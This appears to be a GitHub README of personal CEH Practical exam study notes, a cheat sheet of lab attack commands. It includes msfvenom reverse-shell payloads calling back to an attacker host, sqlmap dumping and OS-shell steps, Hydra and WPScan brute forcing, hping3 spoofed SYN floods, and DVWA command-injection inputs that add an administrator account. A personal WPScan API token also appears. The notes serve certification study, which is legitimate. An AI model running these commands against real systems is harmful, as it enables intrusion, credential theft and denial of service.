
# CEH-Practical-Notes-and-Tools
Successfully completed the CEH (Practical) exam by EC-Council with a score of 20/20! Took me around 2 hours 20 minutes to complete the 6 hour Proctored exam.  

> Just a typical CTF Player/Hacker going back to Basics 💻

> My Personal Notes that I used on the Exam as a Cheatsheet

# Network Hacking
<details>
  <summary>Netdiscover </summary>
  
## Netdiscover
  
* Scan Entire Network for ALive host using ARP
```console
netdiscover -i eth0
netdiscover -r x.x.x.1/24
```

</details>

<details>
  <summary>Nmap </summary>
  
## Nmap

* To scan the live Host
```console
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
```
* To find the Specific open port 
```console
nmap -p port x.x.x.1/24 --open
```
* To find the OS 
```console
nmap -O x.x.x.x 
```
* Comprehensive Scan
```console
nmap -Pn -A x.x.x.1/24 -vv --open   
```
</details>
<details>
  <summary>Wireshark</summary>
  
  ## Wireshark
  
  * Wireshark provides the feature of reassembling a stream of plain text protocol packets into a human-readable format
  
  ```shell
    select_packet > follow > TCP Stream
  ```
  
  * To the get the specific method like ( post , get )
  
  ```console
  http.request.method==post
  http.request.method==get
  ```
  * To the Find DOS & DDOS
  * go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
  
  ```shell
  Statistics > Conversations > IPv4 > Packets
  
  ```
</details>

<details>
  <summary>Covert TCP</summary>
  
  ## Covert TCP
  
  * [covert_TCP](Covert_TCP.c) 
  * In this we have to use Covert TCP technique to analyses the pcapng file.
  * Traverse though each line in Wireshark and concentrate on Identification field, keep an eye on Hex value and ANSI value.
  * Compile the Code
  ```console
cc -o covert_tcp covert_tcp.c
  ```
  * Reciever Machine(Client_IP)
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
  ```
  * Sender Machine(Attacker_IP)
  * Create A Message file that need to be transferred Eg: secret.txt
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
  ```
 
 * Secret message sent using Covert_TCP and it is captured using Wireshark - [Pcap_of_Covert](Covert_TCP_Capture.pcapng)
 * The Secret text is -> Hello  This 123 -

  <img src="/IMG/CovertWireshark.jpg" />

</details>

<details>
  <summary> LLMNR/NBT</summary>
  
  ##  LLMNR/NBT-NS Poisoning

* [Responder](https://github.com/lgandx/Responder) - rogue authentication server to capture hashes.

* This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present.
  
* In Parrot/Kali OS, 

```console
responder -I eth0  
```

* In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
* To crack that hash, use JohntheRipper

```console
john SMBfilename  
```
</details>

<details>
  <summary>Common Ports</summary>
  
 ## Common Port

* 21        - FTP
* 22        - SSH
* 23        - TELNET
* 3306      - MYSQL
* 389,3389  - RDP

</details>

<details>
  <summary>Port Login</summary>

  ## Port Login
    
  * FTP Login
    
  ```console
    ftp x.x.x.x
  ```
    
  * SSH Login  
  ```console
    ssh username@x.x.x.x
  ```
    
  * TELNET Login
  ```console
    telnet x.x.x.x
  ```
   
 </details>
</details>

# Web Hacking
<details>
  <summary>Nslookup</summary>

* To verify Website's Ip
```console
Nslookup wwww.example.com
```
  </details>
  <details>
  <summary>File Upload</summary>
  
  ## File Upload Vulnerability
  
* To create a PHP Payload 
* Copy the PHP code and create a .php
  
```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
```
  
* To create a Reverse_tcp Connection
```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```
  
* To find the secret file 
```console
  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```
  </details>
<details>
  <summary>SQL Injection</summary>
  
  ## SQL Injection
  
  * Login bypass with [' or 1=1 --]
  
### DSSS
  
  * Damn Small SQLi Scanner ([DSSS](https://github.com/stamparm/DSSS)) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)

  * As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.

  ```console
  python3 dsss.py -u "url" --cookie="cookie"
  ```
  <img src="/IMG/DSSS/dsss1.jpg" />
  
  * Open the binded URL
  
  <img src="/IMG/DSSS/dsss2.jpg" />

### SQLMAP
  
* List databases, add cookie values
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
```
* OR
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
```

* List Tables, add databse name
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
```
* List Columns of that table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
```
* Dump all values of the table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
```
  </details>



</details>

# System Hacking

<details>
  <summary>System</summary>
  
  ## System 

  * To create a Payload 
```console
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
```
* To take a reverse TCP connection from windows
```console
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST= attacker-IP  
set LPORT= attacker-Port 
run
```

</details>

# Android Hacking
<details>
  <summary>ADB</summary>

  ## ADB
  
* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```
</details>
<details>
  <summary>PhoneSploit</summary>
  
## PhoneSploit tool
  
* To install Phonesploit 

```console
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama
```
* To run Phonesploit
```console
python3 phonesploit.py
```
* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
* Type 4, to Access Shell on phone
* Download File using PhoneSploit
```console
9. Pull Folders from Phone to PC
```
* Enter the Full Path of file to Download
```console
sdcard/Download/secret.txt
```  
</details>

# Password Cracking



<details>
  <summary>Wpscan</summary>
  
## Wordpress

* Wordpress site only Users Enumeration
```console
wpscan --url http://example.com/ceh --enumerate u
```
  * Direct crack if we have user/password detail
```console
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
```
</details>

<details>
  <summary>Hydra</summary>

## Hydra

### SSH
```console
hydra -l username -P passlist.txt x.x.x.x ssh
```
### FTP
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
```
* If the service isn't running on the default port, use -s
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
```
* FTP Get command
* Used to download the specific file from FTP to attacker or local machine
```console
get flag.txt ~/Desktop/filepath/flag.txt
get flag.txt .
```
### TELNET
```console
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
```  
</details>
  
# Steganography
  <details>
    <summary>Snow</summary>

### Snow
    
* Whitespace Steganography using [Snow](https://darkside.com.au/snow/snwdos32.zip)
* To hide the Text  
  
```console
SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
```

* To unhide the Hidden Text

```console
SNOW.EXE -C -p test hide.txt
```
<img src="/IMG/Snow.png"/>

</details>
<details>
  <summary>CrypTool</summary>
  
  ### CrypTool
  
  * [CrypTool](https://www.cryptool.org/en/ct1/downloads) for hex 
  
  <img src = "/IMG/Cryptool/CT.png"/>
  
  * To Encrypt
  
  <img src = "/IMG/Cryptool/CT5.png"/>
  <img src = "/IMG/Cryptool/CT6.png"/>
  
  * Use Key 05 
  
  <img src = "/IMG/Cryptool/CT7.png"/>
  <img src = "/IMG/Cryptool/CT8.png"/>
  <img src = "/IMG/Cryptool/CT9.png"/>
  <img src = "/IMG/Cryptool/CT10.png"/>
  <img src = "/IMG/Cryptool/CT11.png"/>
  
  * To Decrypt
  
  <img src = "/IMG/Cryptool/CT12.png"/>
  <img src = "/IMG/Cryptool/CT13.png"/>
  <img src = "/IMG/Cryptool/CT14.png"/>
  <img src = "/IMG/Cryptool/CT15.png"/>
  <img src = "/IMG/Cryptool/CT16.png"/>
 </details>
  
 <details>
   <summary>HashCalc</summary>
   
   ## HashCalc
    
   * HashCalc Interface.
   <img src = "/IMG/HashCalc/Hcal1.png"/>

   * Create a text file.
   <img src = "/IMG/HashCalc/Hcal2.png"/>
   
   * Choose text file.
   <img src = "/IMG/HashCalc/Hcal3.png"/>
   
   * Hash Value of text file.
   <img src = "/IMG/HashCalc/Hcal4.png"/>
   
   * Modify the text inside the file. 
   <img src = "/IMG/HashCalc/Hcal5.png"/>
   
   * Compare the hash, It will vary.
   <img src = "/IMG/HashCalc/Hcal6.png"/>
   
 </details>

  <details>
    <summary>HashMyFile</summary>
 
  ## HashMyFile  
    
  * HashMyFile Application
  <img src = "/IMG/HashMyFile/HMF1.png"/>
    
  * add folder to Hash the file presented in Folder  
  <img src = "/IMG/HashMyFile/HMF2.png"/>  
  <img src = "/IMG/HashMyFile/HMF3.png"/>

  * After Hash the file
  <img src = "/IMG/HashMyFile/HMF4.png"/>
    
  * Add More Hashing Format
  <img src = "/IMG/HashMyFile/HMF5.png"/>
</details>
  
  <details>
    <summary>MD5 Calculator</summary>
    
    ## MD5 Calculator  
  
  * Create a text file contains "Hello" and save it, Right click the file to compare hash. 
  <img src = "/IMG/MD5 Calc/MD5Calc1.png"/>  
  
  * MD5 Hash of text file
  <img src = "/IMG/MD5 Calc/MD5Calc2.png"/> 
  
  <img src = "/IMG/MD5 Calc/MD5Calc3.png"/>  
  
  <img src = "/IMG/MD5 Calc/MD5Calc4.png"/>  
  
</details>

<details>
    <summary>VeraCrypt</summary>
      
  ## VeraCrypt 

  
  <img src = "/IMG/VeraCrypt/VC1.png"/>
  <img src = "/IMG/VeraCrypt/VC2.png"/>
  <img src = "/IMG/VeraCrypt/VC3.png"/>
  <img src = "/IMG/VeraCrypt/VC4.png"/>
  <img src = "/IMG/VeraCrypt/VC5.png"/>
  <img src = "/IMG/VeraCrypt/VC6.png"/>
  <img src = "/IMG/VeraCrypt/VC7.png"/>
  <img src = "/IMG/VeraCrypt/VC8.png"/>
  <img src = "/IMG/VeraCrypt/VC9.png"/>
  <img src = "/IMG/VeraCrypt/VC10.png"/>
  <img src = "/IMG/VeraCrypt/VC11.png"/>
  <img src = "/IMG/VeraCrypt/VC12.png"/>
  <img src = "/IMG/VeraCrypt/VC13.png"/>
  <img src = "/IMG/VeraCrypt/VC14.png"/>
  <img src = "/IMG/VeraCrypt/VC15.png"/>
  <img src = "/IMG/VeraCrypt/VC16.png"/>
  <img src = "/IMG/VeraCrypt/VC17.png"/>
  <img src = "/IMG/VeraCrypt/VC18.png"/>
  
</details> 

<details>
    <summary>BCTextEncoded</summary>
  
  ## BCTextEncoded
    
  <img src = "/IMG/BCTextEncoded/BCTE1.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE2.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE3.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE4.png"/>
    
  <img src = "/IMG/BCTextEncoded/BCTE5.png"/>

  <img src = "/IMG/BCTextEncoded/BCTE6.png"/>


</details>

<details>
    <summary>Keywords</summary>
  
  ## Keywords
  
  
  * Img hidden      - Openstego
  * .hex            - Cryptool
  * Whitespace      - SNOW
  * MD5             - Hashcalc & MD5 Calculator
  * Encoded         - BCTexteditor
  * Volume & mount  - Veracrypt

</details>

# File Transfer
<details>
  <summary>File Transfer</summary>
  
## File Transfer

### Linux to Windows
* used to send a payload by Apache 
```console
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /root/Desktop/filename /var/www/html/share/
  ```
  * to start and verify
  ```console
  service apache2 start 
  service apache2 status
  ```
  * to Download from Windows
  * Open browser 
  ```shell
  IP_OF_LINUX/share
  ```
### Windows to Linux 
* File system > Network > smb///IP_OF_WINDOWS
</details>


# Resource
<details>
  <summary>Course</summary>

  ## Course
  
* [Penetration Testing Student - PTS ](https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student) from [INE](https://my.ine.com/)
* [Practical Ethical Hacking - PEH ](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) from [TCM Security](https://tcm-sec.com/)
* [iLab](https://ilabs.eccouncil.org/ethical-hacking-exercises/) CEH (Practical) Official Lab from [EC-Council](https://www.eccouncil.org/)
* [Youtube free iLab ](https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO)

</details>
<details>
  <summary>TryHackMe</summary>

## TryHackMe
### Learning Path
* [Pre-Security](https://tryhackme.com/paths) 
* [Jr Penetration Tester](https://tryhackme.com/paths)
* [Complete Beginner](https://tryhackme.com/paths) 
### Rooms
* [Linux](https://tryhackme.com/module/linux-fundamentals)
* [Nmap](https://tryhackme.com/room/furthernmap)
* [SQLMAP](https://tryhackme.com/room/sqlmap)
* [Wireshark](https://tryhackme.com/room/wireshark)
* [Hydra](https://tryhackme.com/room/hydra)
* [DVWA](https://tryhackme.com/room/dvwa)
* [OWASP Top 10](https://tryhackme.com/room/owasptop10)

  
</details>  
  DVWA
WINDOWS - COMMAND INJECTION
Easy - Command Injection

Execute 127.0.0.1 & & net user Execute 127.0.0.1 & & net user & & ver command Execute 127.0.0.1 & & net user & & getmac

Medium - Command Injection

127.0.0.1&net user 127.0.0.1&net user&sc query&systeminfo 127.0.0.1&;&ipconfig

High - Command Injection

127.0.0.1|net user

<details>
  <summary>Useful Links</summary>
  
## Links
* [hash.com](https://hashes.com/en/decrypt/hash) is a online hash Identifier and Cracker 
</details>

Final Words: Grab a cup of Tea ☕ and GRIND!!!

# CEH-v12-Practical
**Module 03: Scanning Networks**

**Lab1-Task1: Host discovery**

- **nmap -sn -PR [IP]**
  - **-sn:** Disable port scan
  - **-PR:** ARP ping scan
- **nmap -sn -PU [IP]**
  - **-PU:** UDP ping scan
- **nmap -sn -PE [IP or IP Range]**
  - **-PE:** ICMP ECHO ping scan
- **nmap -sn -PP [IP]**
  - **-PP:** ICMP timestamp ping scan
- **nmap -sn -PM [IP]**
  - **-PM:** ICMP address mask ping scan
- **nmap -sn -PS [IP]**
  - **-PS:** TCP SYN Ping scan
- **nmap -sn -PA [IP]**
  - **-PA:** TCP ACK Ping scan
- **nmap -sn -PO [IP]**
  - **-PO:** IP Protocol Ping scan

**Lab2-Task3: Port and Service Discovery**

- **nmap -sT -v [IP]**
  - **-sT:** TCP connect/full open scan
  - **-v:** Verbose output
- **nmap -sS -v [IP]**
  - **-sS:** Stealth scan/TCP hall-open scan
- **nmap -sX -v [IP]**
  - **-sX:** Xmax scan
- **nmap -sM -v [IP]**
  - **-sM:** TCP Maimon scan
- **nmap -sA -v [IP]**
  - **-sA:** ACK flag probe scan
- **nmap -sU -v [IP]**
  - **-sU:** UDP scan
- **nmap -sI -v [IP]**
  - **-sI:** IDLE/IPID Header scan
- **nmap -sY -v [IP]**
  - **-sY:** SCTP INIT Scan
- **nmap -sZ -v [IP]**
  - **-sZ:** SCTP COOKIE ECHO Scan
- **nmap -sV -v [IP]**
  - **-sV:** Detect service versions
- **nmap -A -v [IP]**
  - **-A:** Aggressive scan

**Lab3-Task2: OS Discovery**

- **nmap -A -v [IP]**
  - **-A:** Aggressive scan
- **nmap -O -v [IP]**
  - **-O:** OS discovery
- **nmap –script smb-os-discovery.nse [IP]**
  - **-–script:** Specify the customized script
  - **smb-os-discovery.nse:** Determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (Port 445 or 139)

**Module 04: Enumeration**

**Lab2-Task1: Enumerate SNMP using snmp-check**

- nmap -sU -p 161 [IP]
- **snmp-check [IP]**

**Addition**

- nbtstat -a [IP] (Windows)
- nbtstat -c

**Module 06: System Hacking**

**Lab1-Task1: Perform Active Online Attack to Crack the System&#39;s Password using Responder**

- **Linux:**
  - cd
  - cd Responder
  - chmox +x ./Responder.py
  - **sudo ./Responder.py -I eth0**
  - passwd: \*\*\*\*
- **Windows**
  - run
  - \\CEH-Tools
- **Linux:**
  - Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt
  - sudo snap install john-the-ripper
  - passwd: \*\*\*\*
  - **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

**Lab3-Task6: Covert Channels using Covert\_TCP**

- **Attacker:**
  - cd Desktop
  - mkdir Send
  - cd Send
  - echo &quot;Secret&quot;->message.txt
  - Place->Network
  - Ctrl+L
  - **smb://[IP]**
  - Account &amp; Password
  - copy and paste covert\_tcp.c
  - **cc -o covert\_tcp covert\_tcp.c**
- **Target:**
  - **tcpdump -nvvx port 8888 -I lo**
  - cd Desktop
  - mkdir Receive
  - cd Receive
  - File->Ctrl+L
  - smb://[IP]
  - copy and paste covert\_tcp.c
  - cc -o covert\_tcp covert\_tcp.c
  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
  - **Tcpdump captures no packets**
- **Attacker**
  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
  - Wireshark (message string being send in individual packet)

**Module 08: Sniffing**

**Lab2-Task1: Password Sniffing using Wireshark**

- **Attacker**
  - Wireshark
- **Target**
  - [www.moviescope.com](http://www.moviescope.com/)
  - Login
- **Attacker**
  - Stop capture
  - File-\&gt;Save as
  - Filter: **http.request.method==POST**
  - RDP log in Target
  - service
  - start Remote Packet Capture Protocol v.0 (experimental)
  - Log off Target
  - Wireshark-\&gt;Capture options-\&gt;Manage Interface-\&gt;Remote Interfaces
  - Add a remote host and its interface
  - Fill info
- **Target**
  - Log in
  - Browse website and log in
- **Attacker**
  - Get packets

**Module 10: Denial-of-Service**

**Lab1-Task2: Perform a DoS Attack on a Target Host using hping3**

- **Target:**
  - Wireshark-\&gt;Ethernet
- **Attacker**
  - **hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood**
    - **-S: Set the SYN flag**
    - **-a: Spoof the IP address**
    - **-p: Specify the destination port**
    - **--flood: Send a huge number of packets**
- **Target**
  - Check wireshark
- **Attacker (Perform PoD)**
  - **hping3 -d 65538 -S -p 21 –flood [Target IP]**
    - **-d: Specify data size**
    - **-S: Set the SYN flag**
- **Attacker (Perform UDP application layer flood attack)**
  - nmap -p 139 10.10.10.19 (check service)
  - **hping3 -2 -p 139 –flood [IP]**
    - **-2: Specify UDP mode**
- **Other UDP-based applications and their ports**
  - CharGen UDP Port 19
  - SNMPv2 UDP Port 161
  - QOTD UDP Port 17
  - RPC UDP Port 135
  - SSDP UDP Port 1900
  - CLDAP UDP Port 389
  - TFTP UDP Port 69
  - NetBIOS UDP Port 137,138,139
  - NTP UDP Port 123
  - Quake Network Protocol UDP Port 26000
  - VoIP UDP Port 5060

**Module 13: Hacking Web Servers**

**Lab2-Task1: Crack FTP Credentials using a Dictionary Attack**

- nmap -p 21 [IP]
- **hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10**

**Module 14: Hacking Web Applications**

**Lab2-Task1: Perform a Brute-force Attack using Burp Suite**

- Set proxy for browser: 127.0.0.1:8080
- Burpsuite
- Type random credentials
- capture the request, right click-\&gt;send to Intrucder
- Intruder-\&gt;Positions
- Clear $
- Attack type: Cluster bomb
- select account and password value, Add $
- Payloads: Load wordlist file for set 1 and set 2
- start attack
- **filter status==302**
- open the raw, get the credentials
- recover proxy settings

**Lab2-Task3: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications**

- Log in a website, change the parameter value (id )in the URL
- Conduct a XSS attack: Submit script codes via text area

**Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit**

- **wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url**  **http://10.10.10.16:8080/CEH**  **--plugins-detection aggressive --enumerate u**
  - **--enumerate u: Specify the enumeration of users**
  - **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
  - **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
- service postgresql start
- msfconsole
- **use auxiliary/scanner/http/wordpress\_login\_enum**
- show options
- **set PASS\_FILE password.txt**
- **set RHOST 10.10.10.16**
- **set RPORT 8080**
- **set TARGETURI**  **http://10.10.10.16:8080/CEH**
- **set USERNAME admin**
- run
- Find the credential

**Lab2-Task6: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)**

- If found command injection vulnerability in an input textfield
- | hostname
- | whoami
- **| tasklist| Taskkill /PID /F**
  - **/PID: Process ID value od the process**
  - **/F: Forcefully terminate the process**
- | dir C:\
- **| net user**
- **| net user user001 /Add**
- **| net user user001**
- **| net localgroup Administrators user001 /Add**
- Use created account user001 to log in remotely

**Module 15: SQL Injection**

**Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**

- Login a website
- Inspect element
- Dev tools-\&gt;Console: document.cookie
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs**
  - **-u: Specify the target URL**
  - **--cookie: Specify the HTTP cookie header value**
  - **--dbs: Enumerate DBMS databases**
- Get a list of databases
- Select a database to extract its tables
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables**
  - **-D: Specify the DBMS database to enumerate**
  - **--tables: Enumerate DBMS database tables**
- Get a list of tables
- Select a column
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --dump**
- Get table data of this column
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell**
- Get the OS Shell
- TASKLIST

**Module 17: Hacking Mobile Platforms**

**Lab 1-Task 4: Exploit the Android Platform through ADB using PhoneSploit**
- cd Phonesploit
- python3 -m pip install colorama
- python3 phonesploit.py
- 3
- 10.10.10.14
- 4
- pwd
- cd sdcard
- cd Download

**Module 20: Cryptography**

**Lab1-Task2: Calculate MD5 Hashes using MD5 Calculator**

- Nothing special

**Lab4-Task1: Perform Disk Encryption using VeraCrypt**

- Click VeraCrypt
- Create Volumn
- Create an encrypted file container
- Specify a path and file name
- Set password
- Select NAT
- Move the mouse randomly for some seconds, and click Format
- Exit
- Select a drive, select file, open, mount
- Input password
- Dismount
- Exit

**Module Appendix: Covered Tools**

- **Nmap**
  - Multiple Labs
- **Hydra**
  - Module 13: Lab2-Task1
- **Sqlmap**
  - Module 15: Lab1-Task2
- **WPScan**
  - Module 14: Lab2-Task5
  - wpscan –-url http://10.10.10.10 -t 50 -U admin -P rockyou.txt
- **Nikto**
  - [https://zhuanlan.zhihu.com/p/124246499](https://zhuanlan.zhihu.com/p/124246499%20)
- **John**
  - Module 06: Lab1-Task1
- **Hashcat**
  - **Crack MD5 passwords with a wordlist:**
  - hashcat hash.txt -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
  - **Crack MD5 passwords in a certain format:**
  - hashcat -m 0 -a 3 ./hash.txt &#39;SKY-HQNT-?d?d?d?d&#39;
  - [https://xz.aliyun.com/t/4008](https://xz.aliyun.com/t/4008)
  - [https://tools.kali.org/password-attacks/hashcat](https://tools.kali.org/password-attacks/hashcat)
- **Metasploit**
  - Module 14: Lab2-Task5
- **Responder LLMNR**
  - Module 06: Lab1-Task1
- **Wireshark or Tcpdump**
  - Multiple Labs
- **Steghide**
  - **Hide**
  - steghide embed -cf [img file] -ef [file to be hide]
  - steghide embed -cf 1.jpg -ef 1.txt
  - Enter password or skip
  - **Extract**
  - steghide info 1.jpg
  - steghide extract -sf 1.jpg
  - Enter password if it does exist
- **OpenStego**
  - [https://www.openstego.com/](https://www.openstego.com/)
- **QuickStego**
  - Module 06: Lab0-Task1
- **Dirb (Web content scanner)**
  - [https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86)
  - [https://blog.csdn.net/weixin\_44912169/article/details/105655195](https://blog.csdn.net/weixin_44912169/article/details/105655195)
- **Searchsploit (Exploit-DB)**
  - [https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/](https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/)
- **Crunch (wordlist generator)**
  - [https://www.cnblogs.com/wpjamer/p/9913380.html](https://www.cnblogs.com/wpjamer/p/9913380.html)
- **Cewl (URL spider)**
  - [https://www.freebuf.com/articles/network/190128.html](https://www.freebuf.com/articles/network/190128.html)
- **Veracrypt**
  - Module 20: Lab4-Task1
- **Hashcalc**
  - Module 20: Lab1-Task1 (Nothing special)
- **Rainbow Crack**
  - Module 06: Lab0-Task0
- **Windows SMB**
  - smbclient -L [IP]
  - smbclient \\ip\\sharename
  - nmap -p 445 -sV –script smb-enum-services [IP]
- **Run Nmap at the beginning **
  - nmap -sn -PR  192.168.1.1/24 -oN ip.txt
  - nmap -A -T4 -vv -iL ip.txt -oN nmap.txt 
  - nmap -sU -sV -A -T4 -v -oN udp.txt 
 - **Snow**
  - ./snow -C -p "magic" output.txt  
  - snow -C -m "Secret Text Goes Here!" -p "magic" readme.txt readme2.txt
    • -m → Set your message
    • -p → Set your password
- **Rainbowcrack**
  - Use Winrtgen to generate a rainbow table
  - Launch RainbowCrack
  - File->Load NTLM Hashes from PWDUMP File
  - Rainbow Table->Search Rainbow Table
  - Use the generated rainbow table
  - RainbowCrack automatically starts to crack the hashes
**QuickStego**
  - Launch QuickStego
  - Open Image, and select target .jpg file
  - Open Text, and select a txt file
  - Hide text, save image file
  - Re-launch, Open Image
  - Select stego file
  - Hidden text shows up

**Useful Links**
  - https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/steganography
  - https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
